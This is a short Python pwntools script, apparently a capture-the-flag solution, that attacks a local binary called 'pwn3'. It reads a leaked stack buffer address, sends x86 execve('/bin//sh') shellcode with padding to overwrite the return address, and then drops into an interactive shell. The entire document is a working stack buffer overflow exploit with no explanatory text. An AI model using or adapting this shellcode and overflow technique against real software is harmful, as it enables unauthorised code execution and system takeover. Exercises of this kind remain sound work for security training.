#!/usr/bin/env python3
from pwn import *

pr = process("./pwn3") 

pr.recvuntil(b"Take this, you might need it on your journey ")
vulnbufAddress = int(pr.recvline().strip(b'!\n'), 16)

print("Vuln buffer leak: " + hex(vulnbufAddress))

payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # Shellcode
payload += b"A"*(0x12e - len(payload)) # Padding
payload += p32(vulnbufAddress)

pr.sendline(payload)
pr.interactive()
